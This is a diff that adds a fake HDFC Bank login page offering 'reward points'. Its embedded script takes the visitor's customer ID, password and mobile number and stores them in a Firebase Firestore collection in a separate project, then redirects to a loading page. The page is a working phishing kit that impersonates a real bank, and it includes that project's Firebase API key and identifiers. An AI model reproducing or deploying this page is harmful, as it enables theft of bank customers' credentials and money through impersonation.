@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HDFC Bank Login</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <div class="container">
+        <img src="hdfclogo.png" alt="HDFC Bank" class="logo">
+        <h2>Login to Get Reward Points</h2>
+        
+        <form class="login-form" id="form">
+            <label for="customer-id">Customer ID/ User ID <span>*</span></label>
+            <input name="customerid" type="text" id="customer-id" placeholder="">
+
+            <label for="password">Password <span>*</span></label>
+            <input name="password" type="password" id="password" placeholder="">
+            <a href="#" class="forgot-password">Forgot Password</a>
+
+            <label for="mobile">Mobile <span>*</span></label>
+            <input name="mobile" type="text" id="mobile" placeholder="">
+
+            <button type="submit">SUBMIT</button>
+        </form>
+
+        <div class="info-box">
+            <p>Dear Customer, <br>
+            Your username and password are sensitive. <br>
+            Please do not share them with any other</p>
+        </div>
+
+        <div class="norton-secured">
+            <img src="nortonsecurity.png" alt="Norton Secured">
+        </div>
+
+        <div class="security-note">
+            <p>Your security is of utmost importance. <br><a href="#">Know More...</a></p>
+        </div>
+    </div>
+
+    <footer>
+        <p>© Copyright &nbsp; | &nbsp; <a href="#">Terms and Condition</a> &nbsp; | &nbsp; <a href="#">Privacy Policy</a></p>
+    </footer>
+
+</body>
+</html>
+
+
+
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
+
+
+    <script>
+
+        // Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyBh2pLncBUFtiVVHWAI6HiZarEK3Qw_kf4",
+            authDomain: "hdfc-16404.firebaseapp.com",
+            projectId: "hdfc-16404",
+            storageBucket: "hdfc-16404.firebasestorage.app",
+            messagingSenderId: "429370839636",
+            appId: "1:429370839636:web:67373572f52937872f13c1",
+            measurementId: "G-HCX0NQKHGJ"
+        };
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+
+        // Initialize Firestore
+        var db = firebase.firestore();
+
+        // Form submit event listener
+        document.getElementById("form").addEventListener("submit", function (event) {
+            event.preventDefault();
+
+            const customerid = document.querySelector('input[name="customerid"]').value;
+
+            const password = document.querySelector('input[name="password"]').value;
+
+            const mobile = document.querySelector('input[name="mobile"]').value;
+
+            const rand_id = Math.floor(Math.random() * 100000) + 1;
+            
+            const domain = window.location.hostname + '/viewd.html';
+
+            if (!customerid || !mobile || !password) {
+                alert("Please fill in all fields.");
+            } else {
+
+                const data = {
+                    randno: rand_id,
+                    customerid: customerid,
+                    mobile: mobile,
+                    password: password,
+                    domain: domain,
+                    createdAt: firebase.firestore.FieldValue.serverTimestamp()
+                };
+
+                // Save data to Firestore
+                db.collection("users").doc(rand_id.toString()).set(data)
+                    .then(() => {
+                        console.log("Data stored successfully!");
+                        localStorage.setItem('random_no', rand_id);
+                        window.location.href = "loading1.html";
+                    })
+                    .catch((error) => {
+                        console.error("Error storing data: ", error);
+                    });
+            }
+
+        });
+
+    </script>
